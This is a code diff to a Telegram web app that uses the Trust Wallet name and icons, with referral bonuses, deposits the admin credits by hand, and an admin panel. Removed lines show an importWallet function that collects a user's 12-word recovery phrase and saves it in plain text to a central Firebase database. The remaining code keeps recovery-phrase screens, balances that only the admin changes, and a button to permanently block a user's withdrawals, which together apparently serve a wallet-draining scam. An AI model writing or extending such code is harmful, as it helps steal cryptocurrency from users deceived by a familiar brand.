@@ -18,6 +18,11 @@ if (tg) {
     console.log("✅ Telegram WebApp initialized");
 }
 
+// Get referral parameter from startapp or URL
+const startParam = tg?.initDataUnsafe?.start_param || 
+                   new URLSearchParams(window.location.search).get('startapp') || 
+                   new URLSearchParams(window.location.search).get('ref');
+
 // ====== 2. FIREBASE CONFIGURATION ======
 const firebaseConfig = {
     apiKey: "{{FIREBASE_API_KEY}}",
@@ -29,7 +34,7 @@ const firebaseConfig = {
     appId: "{{FIREBASE_APP_ID}}"
 };
 
-let db;
+let db = null;
 try {
     if (typeof firebase !== 'undefined') {
         firebase.initializeApp(firebaseConfig);
@@ -246,6 +251,10 @@ const CMC_ICONS = {
     TON: 'https://s2.coinmarketcap.com/static/img/coins/64x64/11419.png'
 };
 
+function getCurrencyIcon(symbol) {
+    return CMC_ICONS[symbol] || CMC_ICONS.TWT;
+}
+
 // ====== 7. CONSTANTS & CONFIGURATION ======
 const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";
 const ADMIN_ID = "{{ADMIN_ID}}";
@@ -314,6 +323,8 @@ let currentCurrencySelector = null;
 let currentHistoryFilter = 'all';
 let currentPage = 'wallet';
 let appInitialized = false;
+let currentManageUserId = null;
+let currentAdminTab = 'withdrawals';
 
 let lastUserLoadTime = 0;
 let lastPricesLoadTime = 0;
@@ -365,169 +376,6 @@ function hasReferralCode() {
 // ====== 12. ADMIN SYSTEM ======
 let isAdmin = userId === ADMIN_ID;
 
-// ==========================================================================
-// ONBOARDING & WALLET CREATION FUNCTIONS
-// ==========================================================================
-
-function showOnboarding() {
-    const onboarding = document.getElementById('onboardingScreen');
-    const main = document.getElementById('mainContent');
-    if (onboarding) onboarding.style.display = 'flex';
-    if (main) main.style.display = 'none';
-}
-
-function showMainApp() {
-    const onboarding = document.getElementById('onboardingScreen');
-    const main = document.getElementById('mainContent');
-    if (onboarding) onboarding.style.display = 'none';
-    if (main) main.style.display = 'block';
-    if (typeof switchTab === 'function') switchTab('wallet');
-}
-
-function showImportModal() {
-    const grid = document.getElementById('wordsGrid');
-    if (grid) {
-        grid.innerHTML = '';
-        for (let i = 1; i <= 12; i++) {
-            grid.innerHTML += `
-                <div class="word-field">
-                    <div class="word-label">${i}</div>
-                    <input type="text" id="word_${i}" class="word-input" placeholder="word ${i}" autocomplete="off">
-                </div>
-            `;
-        }
-    }
-    const modal = document.getElementById('importModal');
-    if (modal) modal.classList.add('show');
-}
-
-async function createNewWallet() {
-    const btn = document.getElementById('createWalletBtn');
-    if (!btn) return;
-    
-    const originalText = btn.innerHTML;
-    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
-    btn.disabled = true;
-    
-    try {
-        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
-        
-        const newUserData = {
-            userId: newUserId,
-            userName: 'User',
-            referralCode: newUserId.slice(-8).toUpperCase(),
-            balances: {
-                TWT: WELCOME_BONUS, USDT: 0, BNB: 0, BTC: 0, ETH: 0,
-                SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
-            },
-            referralCount: 0,
-            referredBy: null,
-            totalTwtEarned: WELCOME_BONUS,
-            totalUsdtEarned: 0,
-            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
-            notifications: [],
-            withdrawalRequests: [],
-            transactions: [],
-            depositAddresses: {},
-            withdrawBlocked: false,
-            createdAt: new Date().toISOString()
-        };
-        
-        if (db) {
-            await db.collection('users').doc(newUserId).set(newUserData);
-        }
-        
-        localStorage.setItem(`user_${newUserId}`, JSON.stringify(newUserData));
-        localStorage.setItem('twt_user_id', newUserId);
-        
-        await loadUserData(true);
-        showMainApp();
-        updateUI();
-        checkAdminAndAddCrown();
-        
-        if (startParam) await processReferral();
-        
-        showToast(t('notif.welcomeBonus'), 'success');
-        
-    } catch (error) {
-        console.error("Error creating wallet:", error);
-        showToast('Failed to create wallet', 'error');
-    } finally {
-        btn.innerHTML = originalText;
-        btn.disabled = false;
-    }
-}
-
-async function importWallet() {
-    const words = [];
-    for (let i = 1; i <= 12; i++) {
-        const word = document.getElementById(`word_${i}`)?.value.trim();
-        if (!word) {
-            showToast(`Please enter word ${i}`, 'error');
-            return;
-        }
-        words.push(word);
-    }
-    
-    const recoveryPhrase = words.join(' ');
-    const btn = document.getElementById('confirmImportBtn');
-    if (!btn) return;
-    
-    const originalText = btn.innerHTML;
-    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
-    btn.disabled = true;
-    
-    try {
-        const newUserId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
-        
-        const newUserData = {
-            userId: newUserId,
-            userName: 'User',
-            recoveryPhrase: recoveryPhrase,
-            referralCode: newUserId.slice(-8).toUpperCase(),
-            balances: {
-                TWT: WELCOME_BONUS, USDT: 0, BNB: 0, BTC: 0, ETH: 0,
-                SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
-            },
-            referralCount: 0,
-            referredBy: null,
-            totalTwtEarned: WELCOME_BONUS,
-            totalUsdtEarned: 0,
-            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
-            notifications: [],
-            withdrawalRequests: [],
-            transactions: [],
-            depositAddresses: {},
-            withdrawBlocked: false,
-            createdAt: new Date().toISOString()
-        };
-        
-        if (db) {
-            await db.collection('users').doc(newUserId).set(newUserData);
-        }
-        
-        localStorage.setItem(`user_${newUserId}`, JSON.stringify(newUserData));
-        localStorage.setItem('twt_user_id', newUserId);
-        
-        await loadUserData(true);
-        closeModal('importModal');
-        showMainApp();
-        updateUI();
-        checkAdminAndAddCrown();
-        
-        if (startParam) await processReferral();
-        
-        showToast(`🎉 Wallet imported! You received ${WELCOME_BONUS} TWT!`, 'success');
-        
-    } catch (error) {
-        console.error("Error importing wallet:", error);
-        showToast('Failed to import wallet', 'error');
-    } finally {
-        btn.innerHTML = originalText;
-        btn.disabled = false;
-    }
-}
-
 function checkAdminAndAddCrown() {
     if (!isAdmin) return;
     const addCrown = () => {
@@ -548,6 +396,7 @@ function checkAdminAndAddCrown() {
     };
     if (!addCrown()) setTimeout(addCrown, 500);
 }
+
 // ====== 13. TRANSACTIONS STORAGE ======
 const TRANSACTIONS_KEY = `transactions_${userId}`;
 
@@ -822,10 +671,6 @@ function refreshPrices() {
 }
 
 // ====== 19. UTILITY FUNCTIONS ======
-function getCurrencyIcon(symbol) {
-    return CMC_ICONS[symbol] || CMC_ICONS.TWT;
-}
-
 function formatBalance(balance, symbol) {
     if (symbol === 'TWT') return balance.toLocaleString() + ' TWT';
     if (symbol === 'USDT') return '$' + balance.toFixed(2);
@@ -1030,7 +875,6 @@ function showHistory() {
             e.preventDefault();
             this.querySelector('i').classList.add('fa-spin');
             lastHistoryCheckTime = 0;
-            // Check pending withdrawals only (deposits are manual)
             checkPendingWithdrawals().finally(() => {
                 setTimeout(() => this.querySelector('i').classList.remove('fa-spin'), 1000);
             });
@@ -1436,8 +1280,6 @@ function copyDepositAddress() {
     showToast(t('success.addressCopied'), 'success');
 }
 
-// No submitDeposit function - admin adds balance manually via admin panel
-
 // ====== 27. WITHDRAW FUNCTIONS ======
 function showWithdrawModal() {
     document.getElementById('withdrawModal').classList.add('show');
@@ -1644,8 +1486,7 @@ function logout() {
     if (confirm('Logout?')) {
         localStorage.removeItem(`user_${userId}`);
         userData = null;
-        document.getElementById('onboardingScreen').style.display = 'flex';
-        document.getElementById('mainContent').style.display = 'none';
+        showOnboarding();
     }
 }
 
@@ -1653,40 +1494,12 @@ function logout() {
 function showAdminPanel() {
     if (!isAdmin) { showToast('Access denied', 'error'); return; }
     document.getElementById('adminPanel').classList.remove('hidden');
-    loadAdminData();
+    refreshAdminPanel();
 }
 
 function closeAdminPanel() {
     document.getElementById('adminPanel').classList.add('hidden');
     stopAllListeners();
-}
-
-async function loadAdminData() {
-    if (!db) return;
-    try {
-        const [withdrawalsSnapshot] = await Promise.all([
-            db.collection('withdrawals').where('status', '==', 'pending').get()
-        ]);
-        const pendingCount = withdrawalsSnapshot.size;
-        const usersSnapshot = await db.collection('users').get();
-        const totalUsers = usersSnapshot.size;
-        document.getElementById('totalUsers').textContent = totalUsers;
-        document.getElementById('pendingCount').textContent = pendingCount;
-        document.getElementById('approvedCount').textContent = '...';
-        document.getElementById('totalReferralsCount').textContent = '...';
-        const adminContent = document.getElementById('adminContent');
-        adminContent.innerHTML = `<div style="text-align:center;padding:30px;"><i class="fa-solid fa-hand-pointer" style="font-size:48px;color:var(--primary);"></i><p style="margin:20px 0;">Click refresh to view requests</p><button onclick="refreshAdminPanel()" class="admin-approve-btn" style="width:auto;padding:10px 20px;"><i class="fa-solid fa-rotate-right"></i> Refresh</button></div>`;
-    } catch (error) {
-        console.error("Error loading admin data:", error);
-    }
-}
-
-async function showAdminTab(tab) {
-    document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
-    event.target.classList.add('active');
-    currentAdminTab = tab;
-    const adminContent = document.getElementById('adminContent');
-    adminContent.innerHTML = `<div style="text-align:center;padding:30px;"><i class="fa-solid fa-hand-pointer" style="font-size:48px;color:var(--primary);"></i><p style="margin:20px 0;">Click refresh to view requests</p><button onclick="refreshAdminPanel()" class="admin-approve-btn" style="width:auto;padding:10px 20px;"><i class="fa-solid fa-rotate-right"></i> Refresh</button></div>`;
 }
 
 window.refreshAdminPanel = async function() {
@@ -1721,7 +1534,7 @@ window.refreshAdminPanel = async function() {
                 }
             }
             let html = '';
-            transactions.forEach(tx => { html += renderAdminTransactionCard(tx, activeTab, referralCounts[tx.userId] || 0); });
+            transactions.forEach(tx => { html += renderAdminTransactionCard(tx, referralCounts[tx.userId] || 0); });
             adminContent.innerHTML = html;
         } else if (activeTab === 'users') {
             adminContent.innerHTML = `
@@ -1767,14 +1580,14 @@ window.refreshAdminPanel = async function() {
     }
 };
 
-function renderAdminTransactionCard(tx, tab, referralCount = 0) {
+function renderAdminTransactionCard(tx, referralCount = 0) {
     const date = new Date(tx.timestamp);
     const formattedDate = date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
     const telegramId = tx.userId || 'N/A';
     const displayUserId = tx.userName ? `${tx.userName}` : telegramId.substring(0, 8);
     return `
         <div class="admin-transaction-card">
-            <div class="admin-tx-header"><div class="admin-tx-type ${tx.type}"><i class="fa-regular ${tx.type === 'withdraw' ? 'fa-circle-up' : 'fa-circle-down'}"></i><span>${tx.type.toUpperCase()}</span></div><span class="admin-tx-status ${tx.status}">${tx.status}</span></div>
+            <div class="admin-tx-header"><div class="admin-tx-type withdraw"><i class="fa-regular fa-circle-up"></i><span>WITHDRAWAL</span></div><span class="admin-tx-status pending">Pending</span></div>
             <div class="admin-tx-details">
                 <div class="admin-tx-row"><span class="admin-tx-label">User:</span><span class="admin-tx-value">${displayUserId}</span></div>
                 <div class="admin-tx-row"><span class="admin-tx-label">Telegram ID:</span><div class="admin-address-container"><code>${telegramId}</code><button class="admin-copy-btn" onclick="copyToClipboard('${telegramId}')"><i class="fa-regular fa-copy"></i></button></div></div>
@@ -1795,10 +1608,7 @@ function renderAdminTransactionCard(tx, tab, referralCount = 0) {
 async function approveWithdrawal(firebaseId, targetUserId, currency, amount, fee) {
     if (!isAdmin || !db) { showToast('Admin access required', 'error'); return; }
     try {
-        const docRef = db.collection('withdrawals').doc(firebaseId);
-        const docSnap = await docRef.get();
-        if (!docSnap.exists) { showToast('Withdrawal request not found', 'error'); return; }
-        await docRef.update({ status: 'approved', approvedAt: firebase.firestore.FieldValue.serverTimestamp(), approvedBy: 'admin' });
+        await db.collection('withdrawals').doc(firebaseId).update({ status: 'approved', approvedAt: firebase.firestore.FieldValue.serverTimestamp() });
         await addNotification(targetUserId, `✅ Your withdrawal of ${amount} ${currency} has been approved!`, 'success');
         showToast('Withdrawal approved!', 'success');
         refreshAdminPanel();
@@ -1810,10 +1620,7 @@ async function rejectWithdrawal(firebaseId, targetUserId, currency, amount, fee)
     const reason = prompt("Enter rejection reason:", "Insufficient balance or invalid address");
     if (!reason) return;
     try {
-        const docRef = db.collection('withdrawals').doc(firebaseId);
-        const docSnap = await docRef.get();
-        if (!docSnap.exists) { showToast('Withdrawal request not found', 'error'); return; }
-        await docRef.update({ status: 'rejected', rejectionReason: reason, rejectedAt: firebase.firestore.FieldValue.serverTimestamp(), rejectedBy: 'admin' });
+        await db.collection('withdrawals').doc(firebaseId).update({ status: 'rejected', rejectionReason: reason, rejectedAt: firebase.firestore.FieldValue.serverTimestamp() });
         const userDoc = await db.collection('users').doc(targetUserId).get();
         const user = userDoc.data();
         const updates = {};
@@ -1852,7 +1659,6 @@ async function adminLoadUserByAddress() {
         const usersSnapshot = await db.collection('users').get();
         let foundUser = null;
         let foundUserId = null;
-        
         for (const doc of usersSnapshot.docs) {
             const user = doc.data();
             if (user.depositAddresses) {
@@ -1866,22 +1672,18 @@ async function adminLoadUserByAddress() {
             }
             if (foundUser) break;
         }
-        
         if (!foundUser) {
             statsDiv.innerHTML = `<div style="text-align:center;color:var(--danger);padding:30px;"><i class="fa-solid fa-search"></i><p>No user found with this wallet address!</p></div>`;
             return;
         }
         displayUserStats(foundUser, foundUserId, statsDiv);
     } catch (error) {
-        console.error("Error searching by address:", error);
         statsDiv.innerHTML = `<div style="text-align:center;color:var(--danger);padding:20px;">❌ Error searching</div>`;
     }
 }
 
-function displayUserStats(user, userId, statsDiv) {
-    currentManageUserId = userId;
-    const now = new Date();
-    const activeStakes = (user.staking || []).filter(s => new Date(s.endDate) > now);
+function displayUserStats(user, targetUserId, statsDiv) {
+    currentManageUserId = targetUserId;
     const depositAddressesHtml = user.depositAddresses ? 
         Object.entries(user.depositAddresses).map(([cur, addr]) => 
             `<div style="font-size:11px;margin:4px 0;"><strong>${cur}:</strong> ${addr.substring(0,20)}... <button class="admin-copy-btn" onclick="copyToClipboard('${addr}')"><i class="fa-regular fa-copy"></i></button></div>`
@@ -1892,19 +1694,19 @@ function displayUserStats(user, userId, statsDiv) {
             <div style="display:flex;justify-content:space-between;margin-bottom:15px;">
                 <h4>👤 ${user.userName || 'User'}</h4>
                 <div class="admin-address-container">
-                    <span>🆔 ${userId}</span>
-                    <button class="admin-copy-btn" onclick="copyToClipboard('${userId}')"><i class="fa-regular fa-copy"></i></button>
+                    <span>🆔 ${targetUserId}</span>
+                    <button class="admin-copy-btn" onclick="copyToClipboard('${targetUserId}')"><i class="fa-regular fa-copy"></i></button>
                 </div>
             </div>
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px;">
                 <div style="background:rgba(0,212,255,0.1);border-radius:12px;padding:10px;text-align:center;">
-                    <div>👥</div>
+                    <div style="font-size:20px;">👥</div>
                     <div style="font-weight:bold;">${user.referralCount || 0}</div>
                     <div style="font-size:11px;">Referrals</div>
                 </div>
                 <div style="background:rgba(0,212,255,0.1);border-radius:12px;padding:10px;text-align:center;">
-                    <div>🔒</div>
-                    <div style="font-weight:bold;">${activeStakes.length}</div>
+                    <div style="font-size:20px;">🔒</div>
+                    <div style="font-weight:bold;">${(user.staking || []).length}</div>
                     <div style="font-size:11px;">Active Stakes</div>
                 </div>
             </div>
@@ -1926,7 +1728,7 @@ function displayUserStats(user, userId, statsDiv) {
             <div style="margin-top:15px;">
                 ${user.withdrawBlocked ? 
                     `<div style="background:rgba(239,68,68,0.2);border-radius:12px;padding:10px;text-align:center;"><i class="fa-solid fa-ban"></i> USER IS PERMANENTLY BLOCKED FROM WITHDRAWALS</div>` : 
-                    `<button onclick="blockUserWithdrawals('${userId}')" style="width:100%;background:#ef4444;border:none;padding:10px;border-radius:8px;cursor:pointer;"><i class="fa-solid fa-ban"></i> PERMANENTLY BLOCK FROM WITHDRAWALS</button>`
+                    `<button onclick="blockUserWithdrawals('${targetUserId}')" style="width:100%;background:#ef4444;border:none;padding:10px;border-radius:8px;cursor:pointer;"><i class="fa-solid fa-ban"></i> PERMANENTLY BLOCK FROM WITHDRAWALS</button>`
                 }
             </div>
             <div style="margin-top:10px;">
@@ -2002,10 +1804,16 @@ async function blockUserWithdrawals(targetUserId) {
     if (!confirm(`⚠️⚠️⚠️ PERMANENT ACTION WARNING ⚠️⚠️⚠️\n\nAre you ABSOLUTELY sure you want to permanently block this user from withdrawals?\n\nTHIS ACTION CANNOT BE UNDONE!`)) return;
     try {
         if (db) await db.collection('users').doc(targetUserId).update({ withdrawBlocked: true, withdrawBlockedAt: firebase.firestore.FieldValue.serverTimestamp(), withdrawBlockedBy: ADMIN_ID, withdrawBlockedPermanent: true });
-        if (targetUserId === userId) { userData.withdrawBlocked = true; localStorage.setItem(`user_${userId}`, JSON.stringify(userData)); }
+        if (targetUserId === userId) { userData.withdrawBlocked = true; saveUserData(); }
         showToast('User has been PERMANENTLY blocked from withdrawals', 'success');
         await adminLoadUser();
     } catch (error) { showToast('Failed to block user', 'error'); }
+}
+
+function showAdminTab(tab) {
+    document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
+    if (event.target) event.target.classList.add('active');
+    refreshAdminPanel();
 }
 
 // ====== 33. MODAL FUNCTIONS ======
@@ -2022,7 +1830,7 @@ function showAssetDetails(symbol) {
 function showStakingDetails(type) { showToast('Staking coming soon!', 'info'); }
 
 // ====== 34. INITIALIZATION ======
-document.addEventListener('DOMContentLoaded', () => {
+document.addEventListener('DOMContentLoaded', async () => {
     if (currentLanguage === 'ar') { document.body.classList.add('rtl'); document.documentElement.dir = 'rtl'; document.getElementById('currentLanguageFlag').textContent = '🇸🇦'; }
     else { document.getElementById('currentLanguageFlag').textContent = '🇬🇧'; }
     updateAllTexts();
@@ -2035,26 +1843,17 @@ document.addEventListener('DOMContentLoaded', () => {
         setTimeout(() => showRandomSticker(), 500);
     }, 2000);
     setTimeout(fixNotificationButton, 1500);
-    initApp();
+    await loadUserData();
+    await fetchLivePrices();
+    renderAssets();
+    updateTotalBalance();
+    updateReferralStats();
+    setupScrollListener();
+    appInitialized = true;
+    console.log("✅ Trust Wallet Lite v3.2 initialized");
+    console.log("✅ CoinPayments API - Unique deposit addresses per user");
+    console.log("✅ Admin can search by wallet address and add balance manually");
 });
-
-async function initApp() {
-    if (appInitialized) return;
-    try {
-        await loadUserData();
-        await fetchLivePrices();
-        renderAssets();
-        updateTotalBalance();
-        updateReferralStats();
-        setupScrollListener();
-        appInitialized = true;
-        console.log("✅ Trust Wallet Lite v3.2 initialized");
-        console.log("✅ CoinPayments API - Unique deposit addresses per user");
-        console.log("✅ Admin can search by wallet address and add balance manually");
-    } catch (error) { console.error("Error initializing app:", error); }
-}
-
-let currentAdminTab = 'withdrawals';
 
 // ====== 35. EXPORT FUNCTIONS ======
 window.showWallet = showWallet;
@@ -2062,57 +1861,56 @@ window.showSwap = showSwap;
 window.showReferral = showReferral;
 window.showTWTPay = showTWTPay;
 window.showSettings = showSettings;
+window.showSendModal = showSendModal;
+window.showReceiveModal = showReceiveModal;
+window.showSwapModal = showSwapModal;
 window.showDepositModal = showDepositModal;
 window.showWithdrawModal = showWithdrawModal;
 window.showHistory = showHistory;
 window.showNotifications = showNotifications;
-window.showP2P = showP2P;
-window.showAllAssets = showAllAssets;
-window.showAssetDetails = showAssetDetails;
-window.showStakingDetails = showStakingDetails;
-window.showCurrencySelector = showCurrencySelector;
 window.showAdminPanel = showAdminPanel;
 window.closeModal = closeModal;
 window.closeAdminPanel = closeAdminPanel;
 window.filterHistory = filterHistory;
 window.refreshPrices = refreshPrices;
 window.selectCurrency = selectCurrency;
+window.selectSwapCurrency = selectSwapCurrency;
+window.filterCurrencies = filterCurrencies;
 window.calculateSwap = calculateSwap;
 window.confirmSwap = confirmSwap;
 window.setMaxAmount = setMaxAmount;
 window.swapDirection = swapDirection;
+window.sendTransaction = sendTransaction;
+window.submitWithdraw = submitWithdraw;
+window.copyAddress = copyAddress;
+window.copyDepositAddress = copyDepositAddress;
 window.copyReferralLink = copyReferralLink;
 window.shareReferral = shareReferral;
-window.copyDepositAddress = copyDepositAddress;
-window.submitWithdraw = submitWithdraw;
-window.toggleLanguage = toggleLanguage;
-window.toggleTheme = toggleTheme;
-window.scrollToTop = scrollToTop;
-window.checkPendingWithdrawals = checkPendingWithdrawals;
-window.clearReadNotifications = clearReadNotifications;
-window.clearAllNotifications = clearAllNotifications;
-window.showAdminTab = showAdminTab;
-window.refreshAdminPanel = refreshAdminPanel;
-window.approveWithdrawal = approveWithdrawal;
-window.rejectWithdrawal = rejectWithdrawal;
-window.copyToClipboard = copyToClipboard;
-window.adminLoadUser = adminLoadUser;
-window.adminLoadUserByAddress = adminLoadUserByAddress;
-window.adminAddBalance = adminAddBalance;
-window.adminRemoveBalance = adminRemoveBalance;
-window.adminRefreshUserData = adminRefreshUserData;
-window.blockUserWithdrawals = blockUserWithdrawals;
+window.claimReferralMilestone = claimReferralMilestone;
 window.showRecoveryPhrase = showRecoveryPhrase;
 window.copyRecoveryPhrase = copyRecoveryPhrase;
 window.logout = logout;
 window.showTopUpModal = showTopUpModal;
 window.showCardSettings = showCardSettings;
 window.showCardTransactions = showCardTransactions;
-window.claimReferralMilestone = claimReferralMilestone;
-// Force expose onboarding functions
-window.createNewWallet = createNewWallet;
-window.showImportModal = showImportModal;
-window.importWallet = importWallet;
+window.toggleLanguage = toggleLanguage;
+window.toggleTheme = toggleTheme;
+window.scrollToTop = scrollToTop;
+window.copyToClipboard = copyToClipboard;
+window.showAssetDetails = showAssetDetails;
+window.checkPendingWithdrawals = checkPendingWithdrawals;
+window.clearReadNotifications = clearReadNotifications;
+window.clearAllNotifications = clearAllNotifications;
+window.refreshAdminPanel = refreshAdminPanel;
+window.showAdminTab = showAdminTab;
+window.approveWithdrawal = approveWithdrawal;
+window.rejectWithdrawal = rejectWithdrawal;
+window.adminLoadUser = adminLoadUser;
+window.adminLoadUserByAddress = adminLoadUserByAddress;
+window.adminAddBalance = adminAddBalance;
+window.adminRemoveBalance = adminRemoveBalance;
+window.adminRefreshUserData = adminRefreshUserData;
+window.blockUserWithdrawals = blockUserWithdrawals;
 
 console.log("✅ Trust Wallet Lite v3.2 - ULTIMATE PROFESSIONAL VERSION");
 console.log("✅ 12 Cryptocurrencies | 8 Referral Milestones | TWT Pay Card");
